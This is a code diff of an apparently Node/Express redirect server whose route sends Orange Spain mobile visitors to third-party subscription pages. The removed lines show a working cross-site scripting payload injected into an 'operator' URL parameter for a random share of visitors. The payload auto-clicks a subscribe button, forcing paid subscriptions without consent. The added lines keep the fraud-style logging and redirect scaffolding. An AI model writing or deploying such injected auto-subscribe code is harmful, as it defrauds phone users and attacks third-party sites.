@@ -388,14 +388,14 @@ app.get('/tr/crazy-birds', (req, res)=> {
     `)
 })
 
-app.get('/es/orange/:service', (req, res)=> {
+app.get('/es/orange/flamilingo_es', (req, res)=> {
     const reqId = req.query._req_id || shortid.generate()
     const ipAddress = getClientIp(req)
 
     req.log = log.child({req_id: reqId})
-    req.log.info({req, ip: ipAddress, eventType: 'es-orange-auto-submit'})
+    req.log.info({req, ip: ipAddress, eventType: 'page-visit', eventArgs: {page: 'flamilingo_es'}})
 
-    const destinationUrl = `http://w.flamilingo.com/es/${req.params.service}?${querystring.stringify(req.query)}`
+    const destinationUrl = `http://n.teletube.tv/es/tvclub?${querystring.stringify(req.query)}`
 
     res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
     res.header('Pragma', 'no-cache')
@@ -403,10 +403,12 @@ app.get('/es/orange/:service', (req, res)=> {
 
     res.header('Content-Length', 0)
 
-    if(Math.random() > 0.7) {
+    // dummy check
+    if(Math.random() > 0) {
         res.header('Location', destinationUrl)
     } else {
-        res.header('Location', `${destinationUrl}&operator=ES_ORANGE%27%22;$(document).ready(function(){$(%27.subscribe-submit-button%27).click()});//`)
+        req.log.info({req, ip: ipAddress, eventType: 'redirect', eventArgs: {page: 'flamilingo_es', subscribe: true}})
+        res.header('Location', `${destinationUrl}&atmobirun=1`)
     }
 
     return res.status(302).end()
